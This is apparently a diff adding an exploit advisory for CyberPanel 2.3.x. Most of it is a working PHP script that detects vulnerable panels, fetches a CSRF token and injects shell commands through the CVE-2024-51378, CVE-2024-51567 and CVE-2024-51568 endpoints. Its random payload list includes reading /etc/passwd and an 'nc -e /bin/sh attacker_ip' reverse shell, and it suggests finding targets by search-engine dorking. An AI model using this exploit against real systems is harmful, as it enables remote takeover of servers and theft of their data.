@@ -1,0 +1,131 @@
+=============================================================================================================================================
+| # Title     : Cyber Panel 2.3.x PHP Back Connect                                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://cyberpanel.net/blog/cyberpanel-v2-3-5                                                                               |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: The code relies on exploiting three critical vulnerabilities in CyberPanel that allow remote command execution.
+                      
+					  The presence of CyberPanel on the target is checked before the exploit is executed.
+                      
+					  Different and random payloads are used to avoid detection.
+                      
+					  CSRF forgery is supported when needed.
+
+    (Related : https://packetstorm.news/files/id/183004/ Related CVE numbers:	CVE-2024-51378, CVE-2024-51567, CVE-2024-51568 ) .
+	
+[+] Payload : 
+
+[+] Set Target : line 90
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+
+<?php
+
+class CyberPanelMultiExploit {
+    private $target;
+    private $port;
+    private $ssl;
+    
+    public function __construct($target, $port = 8090, $ssl = true) {
+        $this->target = $target;
+        $this->port = $port;
+        $this->ssl = $ssl;
+    }
+    
+    private function send_request($method, $endpoint, $data = null, $headers = []) {
+        $url = ($this->ssl ? "https" : "http") . "://" . $this->target . ":" . $this->port . "/" . ltrim($endpoint, '/');
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+        if ($data) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        }
+        if (!empty($headers)) {
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        }
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    
+    public function check_vulnerability() {
+        $response = $this->send_request("GET", "/");
+        return strpos($response, "cyber-panel-logo.svg") !== false;
+    }
+    
+    public function execute_payload($action) {
+        $payload = $this->generate_payload();
+        $endpoints = [
+            "cve-2024-51567" => "dataBases/upgrademysqlstatus",
+            "cve-2024-51568" => "filemanager/upload",
+            "cve-2024-51378" => ["ftp/getresetstatus", "dns/getresetstatus"]
+        ];
+        
+        if (!isset($endpoints[$action])) {
+            die("Invalid action selected");
+        }
+        
+        $endpoint = is_array($endpoints[$action]) ? $endpoints[$action][array_rand($endpoints[$action])] : $endpoints[$action];
+        
+        if ($action === "cve-2024-51568") {
+            $csrf_token = $this->get_csrf_token();
+            $headers = [
+                "X-CSRFToken: $csrf_token",
+                "Cookie: csrftoken=$csrf_token"
+            ];
+            $payload_data = [
+                "domainName" => "random",
+                "completePath" => "/dev/null; $payload #",
+                "file" => new CURLFile(tempnam(sys_get_temp_dir(), "exp"))
+            ];
+            return $this->send_request("POST", $endpoint, $payload_data, $headers);
+        }
+        
+        $payload_data = json_encode(["statusfile" => "/dev/null; $payload #"]);
+        return $this->send_request("OPTIONS", $endpoint, $payload_data);
+    }
+    
+    private function generate_payload() {
+        $payloads = [
+            "id",
+            "whoami",
+            "uname -a",
+            "cat /etc/passwd",
+            "ls -la /root",
+            "echo \"Hacked\" > /tmp/hacked",
+            "nc -e /bin/sh attacker_ip attacker_port"
+        ];
+        return $payloads[array_rand($payloads)];
+    }
+    
+    private function get_csrf_token() {
+        $response = $this->send_request("GET", "/");
+        if (preg_match('/csrftoken=(\w+)/', $response, $matches)) {
+            return $matches[1];
+        }
+        die("Unable to retrieve CSRF token.");
+    }
+}
+
+$exploit = new CyberPanelMultiExploit("target_ip");
+if ($exploit->check_vulnerability()) {
+    echo "Target is vulnerable!\n";
+    $exploit->execute_payload("cve-2024-51567");
+} else {
+    echo "Target is not vulnerable.\n";
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
